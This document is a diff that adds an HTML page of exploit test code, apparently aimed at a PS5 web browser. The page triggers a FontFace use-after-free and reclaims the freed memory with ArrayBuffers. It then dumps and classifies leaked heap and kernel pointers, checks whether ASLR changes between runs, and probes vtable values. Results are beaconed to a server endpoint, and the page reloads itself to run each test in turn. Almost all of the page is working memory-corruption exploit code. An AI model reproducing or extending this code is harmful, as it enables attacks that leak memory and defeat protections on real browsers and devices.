@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>P844v7</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#111;color:#0f0;font:11px/1.4 monospace;padding:8px;overflow-y:auto}
+#log{white-space:pre-wrap;word-break:break-all}
+</style>
+</head>
+<body>
+<div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(s){L.textContent+=s+'\n';}
+function bn(tag,data){
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/ps5_beacon.php?tag='+encodeURIComponent(tag)+'&data='+encodeURIComponent(data||''),false);
+    x.send();
+  }catch(e){}
+}
+
+var KEY='p844v7_test';
+function getTest(){try{return parseInt(localStorage.getItem(KEY))||0;}catch(e){return 0;}}
+function setTest(n){try{localStorage.setItem(KEY,String(n));}catch(e){}}
+function clearTest(){try{localStorage.removeItem(KEY);}catch(e){}}
+
+var testNum=getTest();
+log('P844v7 BOOT test='+testNum);
+bn('P844v7-BOOT','test='+testNum);
+
+// Helper: full 192-byte dump as hex qwords
+function dumpAB(ab){
+  var bv=new BigUint64Array(ab);
+  var parts=[];
+  for(var j=0;j<24;j++){
+    if(bv[j]!==0n)parts.push(j+'='+bv[j].toString(16));
+  }
+  return parts.join(';');
+}
+
+// Helper: classify pointer
+function classifyPtr(val){
+  var hi=Number(val>>32n);
+  var lo=Number(val&0xFFFFFFFFn);
+  if(hi>=0x10&&hi<=0x7FFF)return 'HEAP';
+  if(hi>=0xFFFF8000)return 'KERN';
+  if(hi===0&&lo>0x10000)return 'LOW';
+  if(val===0n)return 'ZERO';
+  if(val<0x10000n)return 'SMALL';
+  return 'UNK';
+}
+
+var TESTS=[
+  // T0: FontFace UAF — FULL 192B DUMP of ALL reclaimed buffers
+  function T0(){
+    var fabs=[];var bestDump='none';var hitIdx=-1;var hitCount=0;
+    try{
+      var st=document.createElement('style');
+      st.textContent="@font-face{font-family:dd7;src:local(Arial);unicode-range:U+0042;}";
+      document.head.appendChild(st);
+      var face=new FontFace('df7',"local('Helvetica')",{unicodeRange:'U+0041'});
+      document.fonts.add(face);void face.loaded;
+      var ffired=false;
+      Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+        get:function(){if(ffired)return undefined;ffired=true;
+          st.remove();st.textContent='';st=null;
+          try{document.fonts.delete(this);}catch(e){}
+          document.body.offsetHeight;
+          fabs=[];for(var i=0;i<80;i++)fabs.push(new ArrayBuffer(192));
+          try{document.fonts.check('1em dd7');}catch(e){}
+          document.body.offsetHeight;
+          return undefined;
+        },set:function(){}});
+      document.fonts.load('1em df7, dd7','AB');
+      for(var i=0;i<50;i++){var a=new Array(5000);a=null;}
+      document.body.offsetHeight;
+      // Find ALL non-zero buffers and dump them
+      for(var i=0;i<fabs.length;i++){
+        var bv=new BigUint64Array(fabs[i]);
+        var hasData=false;
+        for(var j=0;j<24;j++){if(bv[j]!==0n){hasData=true;break;}}
+        if(hasData){hitCount++;hitIdx=i;bestDump=dumpAB(fabs[i]);}
+      }
+    }catch(e){bestDump='err:'+e.message;}
+    return 'hits='+hitCount+'|idx='+hitIdx+'|dump='+bestDump;
+  },
+  // T1: Same UAF but send EACH qword as separate beacon (full detail)
+  function T1(){
+    var fabs=[];var hitBuf=null;
+    try{
+      var st=document.createElement('style');
+      st.textContent="@font-face{font-family:dd7b;src:local(Arial);unicode-range:U+0043;}";
+      document.head.appendChild(st);
+      var face=new FontFace('df7b',"local('Helvetica')",{unicodeRange:'U+0041'});
+      document.fonts.add(face);void face.loaded;
+      var ffired=false;
+      Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+        get:function(){if(ffired)return undefined;ffired=true;
+          st.remove();st.textContent='';st=null;
+          try{document.fonts.delete(this);}catch(e){}
+          document.body.offsetHeight;
+          fabs=[];for(var i=0;i<80;i++)fabs.push(new ArrayBuffer(192));
+          try{document.fonts.check('1em dd7b');}catch(e){}
+          document.body.offsetHeight;
+          return undefined;
+        },set:function(){}});
+      document.fonts.load('1em df7b, dd7b','AB');
+      for(var i=0;i<50;i++){var a=new Array(5000);a=null;}
+      document.body.offsetHeight;
+      // Find first buffer with data
+      for(var i=0;i<fabs.length;i++){
+        var bv=new BigUint64Array(fabs[i]);
+        for(var j=0;j<24;j++){if(bv[j]!==0n){hitBuf=fabs[i];break;}}
+        if(hitBuf)break;
+      }
+    }catch(e){}
+    if(!hitBuf)return 'NO_RECLAIM';
+    // Send full dump as beacon blocks (3 beacons of 8 qwords each)
+    var bv=new BigUint64Array(hitBuf);
+    var block1=[],block2=[],block3=[];
+    for(var j=0;j<8;j++)block1.push(j+':'+bv[j].toString(16));
+    for(var j=8;j<16;j++)block2.push(j+':'+bv[j].toString(16));
+    for(var j=16;j<24;j++)block3.push(j+':'+bv[j].toString(16));
+    bn('P844v7-DUMP-A',block1.join(';'));
+    bn('P844v7-DUMP-B',block2.join(';'));
+    bn('P844v7-DUMP-C',block3.join(';'));
+    // Classify each pointer
+    var classes=[];
+    for(var j=0;j<24;j++){
+      if(bv[j]!==0n)classes.push(j+'='+classifyPtr(bv[j]));
+    }
+    return 'classes='+classes.join(';');
+  },
+  // T2: Run UAF 5 times, compare pointer values (ASLR check)
+  function T2(){
+    var runs=[];
+    for(var run=0;run<5;run++){
+      var fabs=[];var ptrs='none';
+      try{
+        var st=document.createElement('style');
+        st.textContent="@font-face{font-family:rr7_"+run+";src:local(Arial);unicode-range:U+004"+(2+run)+";}";
+        document.head.appendChild(st);
+        var face=new FontFace('rf7_'+run,"local('Helvetica')",{unicodeRange:'U+0041'});
+        document.fonts.add(face);void face.loaded;
+        var ffired=false;
+        (function(s){Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+          get:function(){if(ffired)return undefined;ffired=true;
+            s.remove();s.textContent='';
+            try{document.fonts.delete(this);}catch(e){}
+            document.body.offsetHeight;
+            fabs=[];for(var i=0;i<80;i++)fabs.push(new ArrayBuffer(192));
+            document.body.offsetHeight;
+            return undefined;
+          },set:function(){}});})(st);
+        document.fonts.load('1em rf7_'+run+', rr7_'+run,'AB');
+        for(var i=0;i<30;i++){var a=new Array(3000);a=null;}
+        document.body.offsetHeight;
+        for(var i=0;i<fabs.length;i++){
+          var bv=new BigUint64Array(fabs[i]);
+          if(bv[11]!==0n){
+            ptrs=bv[11].toString(16)+'/'+bv[13].toString(16);
+            break;
+          }
+        }
+      }catch(e){ptrs='err';}
+      runs.push(ptrs);
+    }
+    return runs.join('|');
+  },
+  // T3: UAF inside toString — full dump + pointer classification
+  function T3(){
+    var fabs=[];var hitBuf=null;
+    var obj={toString:function(){
+      try{
+        var st=document.createElement('style');
+        st.textContent="@font-face{font-family:ts7;src:local(Arial);unicode-range:U+0042;}";
+        document.head.appendChild(st);
+        var face=new FontFace('tf7',"local('Helvetica')",{unicodeRange:'U+0041'});
+        document.fonts.add(face);void face.loaded;
+        var ffired=false;
+        Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+          get:function(){if(ffired)return undefined;ffired=true;
+            st.remove();st.textContent='';st=null;
+            try{document.fonts.delete(this);}catch(e){}
+            document.body.offsetHeight;
+            fabs=[];for(var i=0;i<80;i++)fabs.push(new ArrayBuffer(192));
+            try{document.fonts.check('1em ts7');}catch(e){}
+            document.body.offsetHeight;
+            return undefined;
+          },set:function(){}});
+        document.fonts.load('1em tf7, ts7','AB');
+        for(var i=0;i<50;i++){var a=new Array(5000);a=null;}
+        document.body.offsetHeight;
+        for(var i=0;i<fabs.length;i++){
+          var bv=new BigUint64Array(fabs[i]);
+          for(var j=0;j<24;j++){if(bv[j]!==0n){hitBuf=fabs[i];break;}}
+          if(hitBuf)break;
+        }
+      }catch(e){}
+      if(hitBuf){
+        var bv=new BigUint64Array(hitBuf);
+        var b1=[],b2=[],b3=[];
+        for(var j=0;j<8;j++)b1.push(j+':'+bv[j].toString(16));
+        for(var j=8;j<16;j++)b2.push(j+':'+bv[j].toString(16));
+        for(var j=16;j<24;j++)b3.push(j+':'+bv[j].toString(16));
+        bn('P844v7-TS-DUMP-A',b1.join(';'));
+        bn('P844v7-TS-DUMP-B',b2.join(';'));
+        bn('P844v7-TS-DUMP-C',b3.join(';'));
+      }
+      return hitBuf?'RECLAIMED':'NO_RECLAIM';
+    }};
+    _PS.postMessage(obj);
+    if(!hitBuf)return 'NO_RECLAIM';
+    var bv=new BigUint64Array(hitBuf);
+    var classes=[];
+    for(var j=0;j<24;j++){if(bv[j]!==0n)classes.push(j+'='+classifyPtr(bv[j]));}
+    return 'classes='+classes.join(';');
+  },
+  // T4: Read qword[0] of reclaimed — if vtable, high bytes reveal code base
+  function T4(){
+    var fabs=[];var q0='none';var q1='none';
+    try{
+      var st=document.createElement('style');
+      st.textContent="@font-face{font-family:vt7;src:local(Arial);unicode-range:U+0042;}";
+      document.head.appendChild(st);
+      var face=new FontFace('vf7',"local('Helvetica')",{unicodeRange:'U+0041'});
+      document.fonts.add(face);void face.loaded;
+      var ffired=false;
+      Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+        get:function(){if(ffired)return undefined;ffired=true;
+          st.remove();st.textContent='';st=null;
+          try{document.fonts.delete(this);}catch(e){}
+          document.body.offsetHeight;
+          fabs=[];for(var i=0;i<80;i++)fabs.push(new ArrayBuffer(192));
+          try{document.fonts.check('1em vt7');}catch(e){}
+          document.body.offsetHeight;
+          return undefined;
+        },set:function(){}});
+      document.fonts.load('1em vf7, vt7','AB');
+      for(var i=0;i<50;i++){var a=new Array(5000);a=null;}
+      document.body.offsetHeight;
+      for(var i=0;i<fabs.length;i++){
+        var bv=new BigUint64Array(fabs[i]);
+        if(bv[0]!==0n||bv[11]!==0n){
+          q0='0x'+bv[0].toString(16);
+          q1='0x'+bv[1].toString(16);
+          // Also check first 4 qwords for vtable-like values
+          var vt=[];
+          for(var j=0;j<4;j++){
+            var hi=Number(bv[j]>>32n);
+            vt.push(j+':hi=0x'+hi.toString(16));
+          }
+          bn('P844v7-VTABLE',vt.join(';'));
+          break;
+        }
+      }
+    }catch(e){q0='err:'+e.message;}
+    return 'q0='+q0+'|q1='+q1;
+  },
+  // T5: Check if reclaimed pointer[11] points to readable memory
+  // by creating a second UAF at that address
+  function T5(){
+    var leakedAddr=0n;
+    var fabs=[];
+    try{
+      var st=document.createElement('style');
+      st.textContent="@font-face{font-family:rd7;src:local(Arial);unicode-range:U+0042;}";
+      document.head.appendChild(st);
+      var face=new FontFace('rdf7',"local('Helvetica')",{unicodeRange:'U+0041'});
+      document.fonts.add(face);void face.loaded;
+      var ffired=false;
+      Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+        get:function(){if(ffired)return undefined;ffired=true;
+          st.remove();st.textContent='';st=null;
+          try{document.fonts.delete(this);}catch(e){}
+          document.body.offsetHeight;
+          fabs=[];for(var i=0;i<80;i++)fabs.push(new ArrayBuffer(192));
+          try{document.fonts.check('1em rd7');}catch(e){}
+          document.body.offsetHeight;
+          return undefined;
+        },set:function(){}});
+      document.fonts.load('1em rdf7, rd7','AB');
+      for(var i=0;i<50;i++){var a=new Array(5000);a=null;}
+      document.body.offsetHeight;
+      for(var i=0;i<fabs.length;i++){
+        var bv=new BigUint64Array(fabs[i]);
+        if(bv[11]!==0n){leakedAddr=bv[11];break;}
+      }
+    }catch(e){}
+    if(leakedAddr===0n)return 'NO_LEAK';
+    // Now we know a heap address. Check how far our AB backing stores are
+    // by reading the AB's buffer pointer (if accessible)
+    var info=[];
+    info.push('leaked=0x'+leakedAddr.toString(16));
+    // Try to find our own AB addresses via fillStyle color channel trick
+    var c=document.createElement('canvas');c.width=1;c.height=1;
+    var ctx=c.getContext('2d');
+    // The AB backing store addresses aren't directly readable, but
+    // we can check if leaked address is near our heap
+    var delta=leakedAddr-0x1000000000n;
+    info.push('heapOff=0x'+delta.toString(16));
+    return info.join('|');
+  }
+];
+
+var NAMES=[
+  'T0-fullDump','T1-detailDump','T2-aslrCheck','T3-toStringDump',
+  'T4-vtableCheck','T5-addrAnalysis'
+];
+
+function advance(){setTest(testNum+1);location.reload();}
+
+function runTest(){
+  if(testNum>=TESTS.length){
+    log('ALL '+TESTS.length+' TESTS COMPLETE');
+    bn('P844v7-DONE','all='+TESTS.length);
+    clearTest();
+    return;
+  }
+  var name=NAMES[testNum]||('T'+testNum);
+  log('Running '+name+'...');
+  bn('P844v7-'+name+'-PRE','starting');
+  try{
+    var result=TESTS[testNum]();
+    log(name+': '+result);
+    bn('P844v7-'+name+'-OK',String(result).substring(0,800));
+  }catch(e){
+    log(name+' EXCEPTION: '+e.message);
+    bn('P844v7-'+name+'-ERR',e.message);
+  }
+  advance();
+}
+
+setTimeout(runTest,200);
+</script>
+</body>
+</html>
